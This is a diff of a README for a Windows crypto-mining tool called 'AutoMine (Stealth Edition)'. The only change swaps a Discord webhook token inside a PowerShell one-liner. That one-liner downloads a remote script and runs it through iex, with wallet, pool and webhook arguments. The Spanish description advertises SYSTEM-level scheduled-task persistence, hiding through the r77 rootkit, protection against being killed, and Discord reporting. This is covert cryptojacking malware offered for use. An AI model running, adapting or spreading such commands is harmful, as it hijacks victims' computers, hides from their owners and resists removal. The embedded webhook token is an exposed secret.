@@ -1,7 +1,7 @@
 
 # AutoMine (Stealth Edition)
 ```powershell
-iex "& { $(irm 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1') } -Wallet 'R9vXXZ2AXz14qg2eKmdNbJBacg5T9Bx7Vz' -Pool 'us-rvn.2miners.com:6060' -Algo 'kawpow' -DiscordWebhook 'https://discord.com/api/webhooks/1211888966391824447/jPqHkvBqXc9mB29gM0mivbS53KBHx8vz8utNbKIG14DmFfDkxybTIBJIOj7F7jmja6S3'"
+iex "& { $(irm 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1') } -Wallet 'R9vXXZ2AXz14qg2eKmdNbJBacg5T9Bx7Vz' -Pool 'us-rvn.2miners.com:6060' -Algo 'kawpow' -DiscordWebhook 'https://discord.com/api/webhooks/1569376706031001620/PbWNqV0sdcSBQufI4bgkp28ZglG4oSpozVeo3o8t-mWAvHEgLqcYyCj6sNpQGHnraM2q'"
 ```
 
 Automatización avanzada de minería de Ravencoin (RVN) con GMiner en Windows. Integra persistencia vía Tarea Programada (SYSTEM), ocultamiento mediante Rootkit (r77), protección contra cierre (Proceso Crítico) y notificaciones vía Discord.
